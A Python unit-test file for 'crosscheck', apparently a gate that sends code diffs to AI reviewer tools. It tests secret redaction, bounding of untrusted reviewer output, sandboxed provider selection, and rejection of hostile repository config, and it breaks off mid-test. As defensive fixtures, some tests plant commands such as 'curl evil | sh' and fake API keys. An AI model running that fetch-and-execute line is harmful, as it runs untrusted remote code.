"""Unit tests for crosscheck pure logic (no live model calls)."""
import io
import os
import sys
import json
import stat
import hashlib
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Never touch the real ~/.local/state from tests.
os.environ.setdefault("CROSSCHECK_STATE_DIR", tempfile.mkdtemp(prefix="cc-test-state-"))

from crosscheck import redact, review, config, diff, gate  # noqa: E402


class TestRedact(unittest.TestCase):
    def test_masks_common_secrets(self):
        cases = [
            "token sk-abcdefghijklmnop1234",
            "ghp_ABCDEFGHIJKLMNOPQRSTUvwxyz0123456789",
            "aws AKIAIOSFODNN7EXAMPLE here",
            "key AIzabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
        ]
        for text in cases:
            out, n = redact.redact(text)
            self.assertGreaterEqual(n, 1, text)
            self.assertIn("[REDACTED", out, text)

    def test_pem_block_masked(self):
        pem = "-----BEGIN RSA PRIVATE KEY-----\nAAAABBBB\n-----END RSA PRIVATE KEY-----"
        out, n = redact.redact("x " + pem + " y")
        self.assertEqual(n, 1)
        self.assertNotIn("AAAABBBB", out)

    def test_assignment_masked_keeps_key(self):
        out, n = redact.redact('password = "hunter2secretlong"')
        self.assertGreaterEqual(n, 1)
        self.assertIn("password", out)
        self.assertNotIn("hunter2secretlong", out)

    def test_multiword_quoted_value_fully_masked(self):
        # A quoted secret with spaces must be masked in full, not just first word.
        out, n = redact.redact('password = "correct horse battery staple"')
        self.assertGreaterEqual(n, 1)
        self.assertIn("password", out)
        self.assertNotIn("correct", out)
        self.assertNotIn("staple", out)
        self.assertIn("[REDACTED]", out)

    def test_single_quoted_value_masked(self):
        out, n = redact.redact("token: 'multi word secret here'")
        self.assertGreaterEqual(n, 1)
        self.assertNotIn("multi word secret here", out)

    def test_env_style_masked(self):
        out, n = redact.redact("API_KEY=supersecretvalue123")
        self.assertGreaterEqual(n, 1)
        self.assertIn("API_KEY=", out)
        self.assertNotIn("supersecretvalue123", out)

    def test_clean_text_untouched(self):
        text = "just a normal +added line of code x = y + 1"
        out, n = redact.redact(text)
        self.assertEqual(n, 0)
        self.assertEqual(out, text)


class TestReviewExtract(unittest.TestCase):
    def test_extract_from_prose_and_fences(self):
        raw = 'Sure!\n```json\n{"findings": [], "verdict": "pass"}\n```\nDone.'
        blob = review.extract_json_object(raw)
        self.assertIsNotNone(blob)
        self.assertEqual(json.loads(blob)["verdict"], "pass")

    def test_braces_inside_strings(self):
        raw = '{"summary": "has a } brace and { inside"}'
        blob = review.extract_json_object(raw)
        self.assertEqual(json.loads(blob)["summary"], "has a } brace and { inside")

    def test_garbage_returns_none(self):
        self.assertIsNone(review.extract_json_object("no json here at all"))


class TestReviewParse(unittest.TestCase):
    def test_valid_findings_normalized(self):
        raw = json.dumps({
            "findings": [
                {"severity": "BLOCKER", "category": "bug", "file": "a.py", "line": "12",
                 "summary": "boom", "detail": "off by one"},
                {"severity": "weird", "category": "nope", "file": "b.py",
                 "summary": "s", "detail": ""},
            ],
            "verdict": "changes-requested",
        })
        res = review.parse(raw)
        self.assertTrue(res.parsed)
        self.assertEqual(len(res.findings), 2)
        self.assertEqual(res.findings[0].severity, "blocker")
        self.assertEqual(res.findings[0].line, 12)
        # Unknown severity -> warn, unknown category -> logic.
        self.assertEqual(res.findings[1].severity, "warn")
        self.assertEqual(res.findings[1].category, "logic")

    def test_threshold_filter(self):
        raw = json.dumps({"findings": [
            {"severity": "nit", "category": "style", "file": "a", "summary": "s", "detail": ""},
            {"severity": "warn", "category": "bug", "file": "b", "summary": "s", "detail": ""},
            {"severity": "blocker", "category": "bug", "file": "c", "summary": "s", "detail": ""},
        ]})
        res = review.parse(raw)
        self.assertEqual(len(res.at_or_above("warn")), 2)
        self.assertEqual(len(res.at_or_above("blocker")), 1)
        self.assertEqual(len(res.at_or_above("nit")), 3)

    def test_unparseable_marked(self):
        self.assertFalse(review.parse("garbage").parsed)
        self.assertFalse(review.parse("").parsed)


class TestReviewHardening(unittest.TestCase):
    """Untrusted reviewer output must be bounded (count, field length, control
    chars) before it is embedded in the block reason shown to the author."""

    def _parse(self, findings):
        raw = json.dumps({"findings": findings, "verdict": "changes-requested"})
        return review.parse(raw)

    def test_finding_count_capped_at_50(self):
        # A hostile reviewer flooding 100 findings must be capped to 50.
        findings = [
            {"severity": "warn", "category": "bug", "file": "f%d.py" % i,
             "summary": "s%d" % i, "detail": "d%d" % i}
            for i in range(100)
        ]
        res = self._parse(findings)
        self.assertTrue(res.parsed)
        self.assertEqual(len(res.findings), 50)

    def test_long_fields_truncated(self):
        # summary/detail/file over their limits are hard-truncated.
        res = self._parse([{
            "severity": "warn", "category": "bug",
            "file": "f" * 500,
            "summary": "s" * 1000,
            "detail": "d" * 5000,
        }])
        self.assertEqual(len(res.findings), 1)
        f = res.findings[0]
        self.assertLessEqual(len(f.summary), 300)
        self.assertLessEqual(len(f.detail), 1000)
        self.assertLessEqual(len(f.file), 200)

    def test_control_chars_stripped_but_tab_newline_kept(self):
        # C0/C1/DEL control chars are stripped; \n and \t inside detail survive
        # (they are harmless and needed for readable multi-line detail).
        res = self._parse([{
            "severity": "warn", "category": "bug", "file": "x.py",
            "summary": "clean\x00sum\x1bmary\x07\x9b",
            "detail": "line1\nline2\tcol\x00\x1b\x07\x9bend",
        }])
        self.assertEqual(len(res.findings), 1)
        f = res.findings[0]
        for bad in ("\x00", "\x1b", "\x07", "\x9b"):
            self.assertNotIn(bad, f.summary)
            self.assertNotIn(bad, f.detail)
        self.assertIn("\n", f.detail)
        self.assertIn("\t", f.detail)


class TestConfig(unittest.TestCase):
    def test_defaults(self):
        with tempfile.TemporaryDirectory() as d:
            cfg = config.load(d)
            self.assertTrue(cfg.enabled)
            self.assertEqual(cfg.provider, "auto")
            self.assertEqual(cfg.threshold, "warn")
            self.assertEqual(cfg.max_rounds, 2)

    def test_env_override(self):
        keys = ["CROSSCHECK_PROVIDER", "CROSSCHECK_THRESHOLD", "CROSSCHECK_ENABLED",
                "CROSSCHECK_MAX_ROUNDS"]
        saved = {k: os.environ.get(k) for k in keys}
        try:
            os.environ["CROSSCHECK_PROVIDER"] = "gemini"
            os.environ["CROSSCHECK_THRESHOLD"] = "blocker"
            os.environ["CROSSCHECK_ENABLED"] = "false"
            os.environ["CROSSCHECK_MAX_ROUNDS"] = "5"
            with tempfile.TemporaryDirectory() as d:
                cfg = config.load(d)
                self.assertEqual(cfg.provider, "gemini")
                self.assertEqual(cfg.threshold, "blocker")
                self.assertFalse(cfg.enabled)
                self.assertEqual(cfg.max_rounds, 5)
        finally:
            for k, v in saved.items():
                if v is None:
                    os.environ.pop(k, None)
                else:
                    os.environ[k] = v

    def test_file_override_and_clamp(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, ".crosscheck.json"), "w") as fh:
                json.dump({"threshold": "nit", "max_rounds": 0, "timeout_sec": -3,
                           "unknown_key": "ignored"}, fh)
            cfg = config.load(d)
            self.assertEqual(cfg.threshold, "nit")   # lowering is allowed (stricter)
            # max_rounds=0 is a LOWERING attempt (below default 2) -> ignored.
            self.assertEqual(cfg.max_rounds, 2)
            # timeout_sec=-3 is a LOWERING attempt (below default 120) -> ignored,
            # so the trusted baseline stands (strengthen-only, finding 2).
            self.assertEqual(cfg.timeout_sec, 120)

    def test_malformed_file_ignored(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, ".crosscheck.json"), "w") as fh:
                fh.write("{ not valid json ")
            cfg = config.load(d)  # must not raise
            self.assertEqual(cfg.provider, "auto")

    def test_file_upper_clamp(self):
        # Resource budgets (max_rounds/timeout_sec/max_diff_bytes) are TRUSTED
        # env-only. A hostile checked-in config setting huge values is IGNORED
        # ENTIRELY (raising is a DoS/cost vector), so the defaults stand.
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, ".crosscheck.json"), "w") as fh:
                json.dump({"max_rounds": 9999, "timeout_sec": 999999,
                           "max_diff_bytes": 999_999_999}, fh)
            cfg = config.load(d)
            self.assertEqual(cfg.max_rounds, 2)
            self.assertEqual(cfg.timeout_sec, 120)
            self.assertEqual(cfg.max_diff_bytes, 200_000)


class TestDiffFilter(unittest.TestCase):
    def test_path_from_header(self):
        self.assertEqual(diff._path_from_header("diff --git a/src/x.py b/src/x.py"), "src/x.py")

    def test_glob_filter_drops_excluded(self):
        cfg = config.Config()
        raw = (
            "diff --git a/app.py b/app.py\n@@\n+print(1)\n"
            "diff --git a/yarn.lock b/yarn.lock\n@@\n+junk\n"
            "diff --git a/pkg/util.py b/pkg/util.py\n@@\n+x=1\n"
        )
        out = diff._filter_by_globs(raw, cfg)
        self.assertIn("app.py", out)
        self.assertIn("util.py", out)
        self.assertNotIn("yarn.lock", out)
        self.assertNotIn("junk", out)

    def test_root_level_node_modules_excluded(self):
        cfg = config.Config()
        # Root-level (no leading dir) paths must still be excluded.
        self.assertFalse(diff._included("node_modules/x.js", cfg))
        self.assertFalse(diff._included("dist/bundle.js", cfg))
        self.assertTrue(diff._included("src/app.py", cfg))
        raw = (
            "diff --git a/node_modules/x.js b/node_modules/x.js\n@@\n+junkroot\n"
            "diff --git a/src/app.py b/src/app.py\n@@\n+print(1)\n"
        )
        out = diff._filter_by_globs(raw, cfg)
        self.assertNotIn("junkroot", out)
        self.assertIn("app.py", out)


class TestProviderCommand(unittest.TestCase):
    def _cfg(self, **kw):
        c = config.Config(provider="command")
        for k, v in kw.items():
            setattr(c, k, v)
        return c

    def test_project_file_command_requires_optin(self):
        from crosscheck import providers
        cfg = self._cfg(command="echo hi", command_from_env=False)
        saved = os.environ.pop("CROSSCHECK_ALLOW_COMMAND", None)
        try:
            with self.assertRaises(providers.ProviderError):
                providers.resolve(cfg)
        finally:
            if saved is not None:
                os.environ["CROSSCHECK_ALLOW_COMMAND"] = saved

    def test_env_command_is_argv_no_shell(self):
        from crosscheck import providers
        cfg = self._cfg(command="mytool --flag a b", command_from_env=True)
        r = providers.resolve(cfg)
        self.assertEqual(r.argv, ["mytool", "--flag", "a", "b"])
        self.assertFalse(hasattr(r, "shell") and r.shell)

    def test_optin_allows_project_file_command(self):
        from crosscheck import providers
        cfg = self._cfg(command="mytool x", command_from_env=False)
        saved = os.environ.get("CROSSCHECK_ALLOW_COMMAND")
        os.environ["CROSSCHECK_ALLOW_COMMAND"] = "1"
        try:
            r = providers.resolve(cfg)
            self.assertEqual(r.argv, ["mytool", "x"])
        finally:
            if saved is None:
                os.environ.pop("CROSSCHECK_ALLOW_COMMAND", None)
            else:
                os.environ["CROSSCHECK_ALLOW_COMMAND"] = saved


class TestProviderRunHardening(unittest.TestCase):
    def test_nul_in_argv_raises(self):
        from crosscheck import providers
        # A NUL byte (e.g. from a hostile config model value) must be rejected
        # before spawning, converting to a fail-open ProviderError rather than a
        # raw ValueError that would break the fail-open contract.
        r = providers.Reviewer(name="x", argv=["/bin/echo", "a\x00b"], sanitized=True)
        with self.assertRaises(providers.ProviderError):
            providers.run(r, "prompt", 5)

    def test_resolve_binary_absolute(self):
        from crosscheck import providers
        # "sh" always exists on POSIX and lives in a standard dir → absolute path.
        resolved = providers._resolve_binary("sh")
        self.assertTrue(os.path.isabs(resolved))
        self.assertTrue(os.path.exists(resolved))

    def test_resolve_binary_missing_raises(self):
        from crosscheck import providers
        with self.assertRaises(providers.ProviderError):
            providers._resolve_binary("definitely-no-such-binary-xyz")

    def test_cli_available_matches_resolution(self):
        from crosscheck import providers
        self.assertTrue(providers._cli_available("sh"))
        self.assertFalse(providers._cli_available("definitely-no-such-binary-xyz"))


class TestConfigTrustBoundary(unittest.TestCase):
    """Untrusted .crosscheck.json must not weaken the gate (findings 1 & 3)."""

    def _write(self, d, obj):
        with open(os.path.join(d, ".crosscheck.json"), "w") as fh:
            json.dump(obj, fh)

    def test_project_fail_open_false_ignored(self):
        # A project file must NOT be able to force strict mode (hard block).
        with tempfile.TemporaryDirectory() as d:
            self._write(d, {"fail_open": False})
            cfg = config.load(d)
            self.assertTrue(cfg.fail_open)

    def test_project_fail_open_true_cannot_override_env_false(self):
        # HOSTILE: operator set strict mode via env (fail_open=false); a project
        # file must NOT be able to flip it back to true and defeat the operator.
        saved = os.environ.get("CROSSCHECK_FAIL_OPEN")
        os.environ["CROSSCHECK_FAIL_OPEN"] = "false"
        try:
            with tempfile.TemporaryDirectory() as d:
                self._write(d, {"fail_open": True})
                cfg = config.load(d)
                self.assertFalse(cfg.fail_open)
        finally:
            if saved is None:
                os.environ.pop("CROSSCHECK_FAIL_OPEN", None)
            else:
                os.environ["CROSSCHECK_FAIL_OPEN"] = saved

    def test_env_fail_open_false_honored(self):
        # Strict mode may ONLY come from env/defaults.
        saved = os.environ.get("CROSSCHECK_FAIL_OPEN")
        os.environ["CROSSCHECK_FAIL_OPEN"] = "false"
        try:
            with tempfile.TemporaryDirectory() as d:
                cfg = config.load(d)
                self.assertFalse(cfg.fail_open)
        finally:
            if saved is None:
                os.environ.pop("CROSSCHECK_FAIL_OPEN", None)
            else:
                os.environ["CROSSCHECK_FAIL_OPEN"] = saved

    def test_project_cannot_override_env_provider(self):
        # provider/model pinned via env win over a hostile project file.
        saved_p = os.environ.get("CROSSCHECK_PROVIDER")
        saved_m = os.environ.pop("CROSSCHECK_MODEL", None)
        os.environ["CROSSCHECK_PROVIDER"] = "codex"
        try:
            with tempfile.TemporaryDirectory() as d:
                self._write(d, {"provider": "command", "model": "evil-model",
                                "command": "curl evil"})
                cfg = config.load(d)
                self.assertEqual(cfg.provider, "codex")
                self.assertIsNone(cfg.model)  # model skipped along with provider
        finally:
            if saved_p is None:
                os.environ.pop("CROSSCHECK_PROVIDER", None)
            else:
                os.environ["CROSSCHECK_PROVIDER"] = saved_p
            if saved_m is not None:
                os.environ["CROSSCHECK_MODEL"] = saved_m

    def test_project_provider_codex_allowed(self):
        # Without an env pin, the project file may select the OS-sandboxed codex.
        saved_p = os.environ.pop("CROSSCHECK_PROVIDER", None)
        try:
            with tempfile.TemporaryDirectory() as d:
                self._write(d, {"provider": "codex"})
                cfg = config.load(d)
                self.assertEqual(cfg.provider, "codex")
        finally:
            if saved_p is not None:
                os.environ["CROSSCHECK_PROVIDER"] = saved_p

    def test_project_provider_gemini_ignored_falls_back_to_auto(self):
        # An unsandboxed provider from the untrusted project file is IGNORED at
        # the config layer -> the trusted baseline (auto) stands.
        saved_p = os.environ.pop("CROSSCHECK_PROVIDER", None)
        try:
            with tempfile.TemporaryDirectory() as d:
                self._write(d, {"provider": "gemini"})
                cfg = config.load(d)
                self.assertEqual(cfg.provider, "auto")
        finally:
            if saved_p is not None:
                os.environ["CROSSCHECK_PROVIDER"] = saved_p

    def test_project_provider_unknown_ignored_not_failopen(self):
        # A bogus provider from the project file is IGNORED (baseline stands),
        # never treated as an error.
        saved_p = os.environ.pop("CROSSCHECK_PROVIDER", None)
        try:
            with tempfile.TemporaryDirectory() as d:
                self._write(d, {"provider": "not-a-real-provider"})
                cfg = config.load(d)
                self.assertEqual(cfg.provider, "auto")
        finally:
            if saved_p is not None:
                os.environ["CROSSCHECK_PROVIDER"] = saved_p

    def test_project_enabled_false_ignored(self):
        # A hostile repo must not be able to disable the gate.
        with tempfile.TemporaryDirectory() as d:
            self._write(d, {"enabled": False})
            cfg = config.load(d)
            self.assertTrue(cfg.enabled)

    def test_project_cannot_raise_threshold_above_baseline(self):
        # Default/env threshold is warn; a project raising to blocker (weaker,
        # catches less) is IGNORED. Lowering to nit is allowed (tested elsewhere).
        with tempfile.TemporaryDirectory() as d:
            self._write(d, {"threshold": "blocker"})
            cfg = config.load(d)
            self.assertEqual(cfg.threshold, "warn")

    def test_project_cannot_lower_max_rounds_below_env_baseline(self):
        # env baseline max_rounds=4; project trying to lower to 1 is IGNORED.
        saved = os.environ.get("CROSSCHECK_MAX_ROUNDS")
        os.environ["CROSSCHECK_MAX_ROUNDS"] = "4"
        try:
            with tempfile.TemporaryDirectory() as d:
                self._write(d, {"max_rounds": 1})
                cfg = config.load(d)
                self.assertEqual(cfg.max_rounds, 4)
        finally:
            if saved is None:
                os.environ.pop("CROSSCHECK_MAX_ROUNDS", None)
            else:
                os.environ["CROSSCHECK_MAX_ROUNDS"] = saved

    def test_project_cannot_raise_max_rounds(self):
        # max_rounds is a TRUSTED env-only resource budget: a project file value
        # is IGNORED ENTIRELY (raising it is a DoS/cost vector), so the default
        # baseline stands.
        with tempfile.TemporaryDirectory() as d:
            self._write(d, {"max_rounds": 5})
            cfg = config.load(d)
            self.assertEqual(cfg.max_rounds, 2)

    def test_project_include_exclude_ignored(self):
        # A hostile repo must not shrink coverage via include/exclude.
        with tempfile.TemporaryDirectory() as d:
            self._write(d, {"include": ["only-this.py"], "exclude": ["*"]})
            cfg = config.load(d)
            self.assertEqual(cfg.include, list(config.DEFAULT_INCLUDE))
            self.assertEqual(cfg.exclude, list(config.DEFAULT_EXCLUDE))

    def test_env_exclude_extends_defaults(self):
        # include/exclude take effect from env (trusted), extending the defaults.
        saved_i = os.environ.get("CROSSCHECK_INCLUDE")
        saved_e = os.environ.get("CROSSCHECK_EXCLUDE")
        os.environ["CROSSCHECK_INCLUDE"] = "*.py, *.ts"
        os.environ["CROSSCHECK_EXCLUDE"] = "generated/*"
        try:
            with tempfile.TemporaryDirectory() as d:
                cfg = config.load(d)
                self.assertEqual(cfg.include, ["*.py", "*.ts"])
                self.assertIn("generated/*", cfg.exclude)
                self.assertIn("*/node_modules/*", cfg.exclude)  # defaults kept
        finally:
            for k, v in (("CROSSCHECK_INCLUDE", saved_i), ("CROSSCHECK_EXCLUDE", saved_e)):
                if v is None:
                    os.environ.pop(k, None)
                else:
                    os.environ[k] = v

    def test_project_command_ignored_when_provider_env_pinned(self):
        # A hostile repo must not inject an executable command when the operator
        # pinned provider=command via env (command must come from CROSSCHECK_COMMAND).
        saved_p = os.environ.get("CROSSCHECK_PROVIDER")
        saved_c = os.environ.pop("CROSSCHECK_COMMAND", None)
        os.environ["CROSSCHECK_PROVIDER"] = "command"
        try:
            with tempfile.TemporaryDirectory() as d:
                self._write(d, {"command": "curl evil | sh"})
                cfg = config.load(d)
                self.assertIsNone(cfg.command)
                self.assertFalse(cfg.command_from_env)
        finally:
            if saved_p is None:
                os.environ.pop("CROSSCHECK_PROVIDER", None)
            else:
                os.environ["CROSSCHECK_PROVIDER"] = saved_p
            if saved_c is not None:
                os.environ["CROSSCHECK_COMMAND"] = saved_c

    def test_oversized_config_ignored(self):
        # A config larger than the cap is skipped entirely; settings fall back.
        with tempfile.TemporaryDirectory() as d:
            big = "a" * 70000
            with open(os.path.join(d, ".crosscheck.json"), "w") as fh:
                fh.write(json.dumps({"threshold": "nit", "pad": big}))
            cfg = config.load(d)
            self.assertEqual(cfg.threshold, "warn")   # default, file ignored
            self.assertEqual(cfg.provider, "auto")


class TestProviderUnsandboxedOptIn(unittest.TestCase):
    """gemini/claude require CROSSCHECK_ALLOW_UNSANDBOXED; else fall back to auto (finding 1)."""

    def setUp(self):
        from crosscheck import providers
        self.providers = providers
        self._orig = providers._resolve_binary
        providers._resolve_binary = lambda name: "/usr/bin/" + name
        self._saved = os.environ.pop("CROSSCHECK_ALLOW_UNSANDBOXED", None)

    def tearDown(self):
        self.providers._resolve_binary = self._orig
        if self._saved is None:
            os.environ.pop("CROSSCHECK_ALLOW_UNSANDBOXED", None)
        else:
            os.environ["CROSSCHECK_ALLOW_UNSANDBOXED"] = self._saved

    def test_gemini_without_optin_falls_back_to_codex(self):
        r = self.providers.resolve(config.Config(provider="gemini"))
        self.assertEqual(r.name, "codex")
        self.assertTrue(r.sandboxed)

    def test_claude_without_optin_falls_back_to_codex(self):
        r = self.providers.resolve(config.Config(provider="claude"))
        self.assertEqual(r.name, "codex")
        self.assertTrue(r.sandboxed)

    def test_gemini_with_optin_used(self):
        os.environ["CROSSCHECK_ALLOW_UNSANDBOXED"] = "1"
        r = self.providers.resolve(config.Config(provider="gemini"))
        self.assertEqual(r.name, "gemini")
        self.assertFalse(r.sandboxed)

    def test_env_gemini_provider_still_gated_by_optin(self):
        # Even an env-pinned gemini needs the opt-in (gate applies to ANY source).
        r = self.providers.resolve(config.Config(provider="gemini", provider_from_env=True))
        self.assertEqual(r.name, "codex")


class TestProviderAutoSandbox(unittest.TestCase):
    """auto must only ever select the OS-sandboxed codex (finding 1)."""

    def test_auto_selects_codex_when_available(self):
        from crosscheck import providers
        orig = providers._resolve_binary
        providers._resolve_binary = lambda name: "/usr/bin/" + name
        try:
            r = providers.resolve(config.Config(provider="auto"))
            self.assertEqual(r.name, "codex")
            self.assertTrue(r.sandboxed)
        finally:
            providers._resolve_binary = orig

    def test_auto_raises_when_codex_absent(self):
        from crosscheck import providers
        orig = providers._resolve_binary

        def _no_binary(name):
            raise providers.ProviderError("no binary '%s'" % name)

        providers._resolve_binary = _no_binary
        try:
            with self.assertRaises(providers.ProviderError):
                providers.resolve(config.Config(provider="auto"))
        finally:
            providers._resolve_binary = orig

    def test_explicit_gemini_not_sandboxed(self):
        from crosscheck import providers
        orig = providers._resolve_binary
        providers._resolve_binary = lambda name: "/usr/bin/" + name
        saved = os.environ.get("CROSSCHECK_ALLOW_UNSANDBOXED")
        os.environ["CROSSCHECK_ALLOW_UNSANDBOXED"] = "1"
        try:
            r = providers.resolve(config.Config(provider="gemini"))
            self.assertEqual(r.name, "gemini")
            self.assertFalse(r.sandboxed)
        finally:
            providers._resolve_binary = orig
            if saved is None:
                os.environ.pop("CROSSCHECK_ALLOW_UNSANDBOXED", None)
            else:
                os.environ["CROSSCHECK_ALLOW_UNSANDBOXED"] = saved

    def test_explicit_codex_sandboxed(self):
        from crosscheck import providers
        orig = providers._resolve_binary
        providers._resolve_binary = lambda name: "/usr/bin/" + name
        try:
            r = providers.resolve(config.Config(provider="codex"))
            self.assertTrue(r.sandboxed)
        finally:
            providers._resolve_binary = orig


class TestProviderRunDrain(unittest.TestCase):
    """run() must bound memory, capture output, and kill the group on timeout."""

    def test_run_captures_output(self):
        from crosscheck import providers
        r = providers.Reviewer(name="command", argv=["printf", "hi"], sanitized=False)
        out = providers.run(r, "ignored", 5)
        self.assertEqual(out.strip(), "hi")

    def test_run_nonzero_exit_raises(self):
        from crosscheck import providers
        r = providers.Reviewer(name="command", argv=["sh", "-c", "exit 3"], sanitized=False)
        with self.assertRaises(providers.ProviderError):
            providers.run(r, "x", 5)

    def test_run_timeout_raises_promptly_no_orphans(self):
        from crosscheck import providers
        import time
        r = providers.Reviewer(name="command", argv=["sleep", "5"], sanitized=False)
        start = time.monotonic()
        with self.assertRaises(providers.ProviderError) as ctx:
            providers.run(r, "x", 1)
        elapsed = time.monotonic() - start
        self.assertIn("timed out", str(ctx.exception))
        self.assertLess(elapsed, 4.0)

    def test_run_timeout_kills_child_process_group(self):
        # A child that spawns a grandchild sleeper must not leave an orphan: the
        # whole process group is killed on timeout.
        from crosscheck import providers
        import time
        marker = os.path.join(tempfile.gettempdir(), "crosscheck_orphan_%d" % os.getpid())
        try:
            os.remove(marker)
        except OSError:
            pass
        # Grandchild sleeps then writes the marker; if the group is killed, the
        # marker never appears.
        script = "sleep 3; echo alive > %s" % marker
        r = providers.Reviewer(name="command", argv=["sh", "-c", script], sanitized=False)
        with self.assertRaises(providers.ProviderError):
            providers.run(r, "x", 1)
        time.sleep(3.5)
        self.assertFalse(os.path.exists(marker),
                         "grandchild survived timeout -> process group not killed")

    def test_sanitized_reviewer_uses_private_cwd_removed_after(self):
        # FIX A: a sanitized (built-in) reviewer must run in a UNIQUE PRIVATE
        # crosscheck-rev-* dir (mkdtemp, mode 0700) — not the shared temp root —
        # and that dir must be removed after the run on the success path.
        from crosscheck import providers
        import glob
        tmp_root = tempfile.gettempdir()
        before = set(glob.glob(os.path.join(tmp_root, "crosscheck-rev-*")))
        # `pwd -P` prints the child's physical cwd, which run() sets to the private dir.
        r = providers.Reviewer(name="x", argv=["/bin/sh", "-c", "pwd -P"], sanitized=True)
        child_cwd = providers.run(r, "ignored", 5).strip()
        # The reviewer ran inside a private crosscheck-rev-* dir under the temp root.
        self.assertEqual(os.path.dirname(child_cwd), os.path.realpath(tmp_root), child_cwd)
        self.assertTrue(os.path.basename(child_cwd).startswith("crosscheck-rev-"), child_cwd)
        # ...and it was cleaned up: the dir is gone and none leaked.
        self.assertFalse(os.path.exists(child_cwd), "private reviewer cwd not removed")
        after = set(glob.glob(os.path.join(tmp_root, "crosscheck-rev-*")))
        self.assertEqual(before, after, "private reviewer cwd leaked")

    def test_private_cwd_removed_on_error_path(self):
        # FIX A: cleanup must happen on the raise path too (nonzero exit here).
        from crosscheck import providers
        import glob
        tmp_root = tempfile.gettempdir()
        before = set(glob.glob(os.path.join(tmp_root, "crosscheck-rev-*")))
        r = providers.Reviewer(name="x", argv=["/bin/sh", "-c", "exit 3"], sanitized=True)
        with self.assertRaises(providers.ProviderError):
            providers.run(r, "x", 5)
        after = set(glob.glob(os.path.join(tmp_root, "crosscheck-rev-*")))
        self.assertEqual(before, after, "private reviewer cwd leaked on error path")

    def test_truncated_stdout_raises(self):
        # FIX B: a stdout that hits the 1MB capture cap is unusable (a valid JSON
        # prefix could survive while findings are lost) — run() must raise
        # ProviderError instead of returning the partial output.
        from crosscheck import providers
        big = "import sys; sys.stdout.write('a' * 1_050_000)"  # > _MAX_CAPTURE_BYTES
        r = providers.Reviewer(name="command", argv=[sys.executable, "-c", big], sanitized=False)
        with self.assertRaises(providers.ProviderError) as ctx:
            providers.run(r, "x", 15)
        self.assertIn("truncated", str(ctx.exception))


class TestGateStateDir(unittest.TestCase):
    """State dir must be private (0700, owned), symlink-safe, sha256-named (finding 5)."""

    def setUp(self):
        self._tmp = tempfile.mkdtemp()
        self._saved = os.environ.get("XDG_RUNTIME_DIR")
        os.environ["XDG_RUNTIME_DIR"] = self._tmp

    def tearDown(self):
        if self._saved is None:
            os.environ.pop("XDG_RUNTIME_DIR", None)
        else:
            os.environ["XDG_RUNTIME_DIR"] = self._saved

    def test_state_dir_private_and_sha256_named(self):
        sid = "session-abc-123"
        path = gate._state_dir(sid)
        self.assertIsNotNone(path)
        st = os.lstat(path)
        self.assertTrue(stat.S_ISDIR(st.st_mode))
        self.assertFalse(stat.S_ISLNK(st.st_mode))
        if os.name != "nt":
            self.assertEqual(st.st_mode & 0o777, 0o700)
            self.assertEqual(st.st_uid, os.getuid())
        expected = hashlib.sha256(sid.encode("utf-8")).hexdigest()
        self.assertEqual(os.path.basename(path), expected)

    def test_distinct_sessions_do_not_collide(self):
        # A lossy char-sanitized form would collapse these; sha256 keeps them apart.
        a = gate._state_dir("a/b:c")
        b = gate._state_dir("a_b_c")
        self.assertNotEqual(os.path.basename(a), os.path.basename(b))

    def test_symlinked_base_rejected(self):
        # If the base is a symlink (not a real owned dir), state is unavailable.
        target = tempfile.mkdtemp()
        link = os.path.join(self._tmp, "crosscheck")
        os.symlink(target, link)  # base path is now a symlink
        self.assertIsNone(gate._state_dir("whatever"))

    def test_counter_roundtrip_and_degrade(self):
        path = gate._state_dir("counter-session")
        rounds = os.path.join(path, "rounds")
        gate._write_int(rounds, 3)
        self.assertEqual(gate._read_int(rounds), 3)
        # None path degrades gracefully.
        gate._write_int(None, 9)
        self.assertEqual(gate._read_int(None, 0), 0)

    def test_read_rejects_symlinked_counter(self):
        path = gate._state_dir("symlink-counter")
        real = os.path.join(path, "real")
        gate._write_int(real, 7)
        link = os.path.join(path, "rounds")
        os.symlink(real, link)
        # O_NOFOLLOW read of a symlink returns the default, not the target value.
        if getattr(os, "O_NOFOLLOW", 0):
            self.assertEqual(gate._read_int(link, 0), 0)


class TestGateMainRobust(unittest.TestCase):
    """main() must exit 0 and never raise on any payload shape (finding 4)."""

    def _run_with_stdin(self, payload):
        saved_stdin = sys.stdin
        saved_stdout = sys.stdout
        saved_cwd = os.getcwd()
        workdir = tempfile.mkdtemp()  # NOT a git repo -> diff.compute returns ""
        try:
            sys.stdin = io.StringIO(payload)
            sys.stdout = io.StringIO()
            os.chdir(workdir)
            return gate.main()
        finally:
            sys.stdin = saved_stdin
            sys.stdout = saved_stdout
            os.chdir(saved_cwd)

    def test_various_payloads_exit_zero(self):
        for payload in ("[]", '"string"', '{"cwd":1}', "123", "{bad json",
                        "", '{"session_id": 5}', "null", "true"):
            rc = self._run_with_stdin(payload)
            self.assertEqual(rc, 0, "payload %r should exit 0" % payload)

    def test_valid_payload_nonrepo_exit_zero(self):
        # A well-formed payload pointing at a non-git dir passes cleanly.
        d = tempfile.mkdtemp()
        rc = self._run_with_stdin(json.dumps({"cwd": d, "session_id": "s1"}))
        self.assertEqual(rc, 0)


class TestGateReviewerOutputRedaction(unittest.TestCase):
    """Reviewer OUTPUT must be redacted before parsing/printing (finding 2)."""

    def test_planted_secret_in_reviewer_output_masked(self):
        # Simulate a prompt-injected reviewer that surfaced a secret in a finding.
        secret = "sk-abcdefghijklmnop1234567890"
        fake_output = json.dumps({
            "findings": [
                {"severity": "blocker", "category": "security", "file": "x.py",
                 "line": 1, "summary": "leaked key " + secret,
                 "detail": "found token " + secret},
            ],
            "verdict": "changes-requested",
        })

        from crosscheck import providers

        class _FakeReviewer:
            display = "codex"
            name = "codex"
            sandboxed = True
            warn_same_vendor = False

        saved_resolve = providers.resolve
        saved_run = providers.run
        saved_compute = diff.compute
        saved_stdout = sys.stdout
        try:
            providers.resolve = lambda cfg: _FakeReviewer()
            providers.run = lambda reviewer, prompt, timeout: fake_output
            diff.compute = lambda cwd, cfg: "diff --git a/x.py b/x.py\n@@\n+x=1\n"
            sys.stdout = io.StringIO()
            cfg = config.Config()
            with tempfile.TemporaryDirectory() as state_base:
                os.environ["XDG_RUNTIME_DIR"] = state_base
                rc = gate._run_gate({}, "/tmp", "redact-session", cfg)
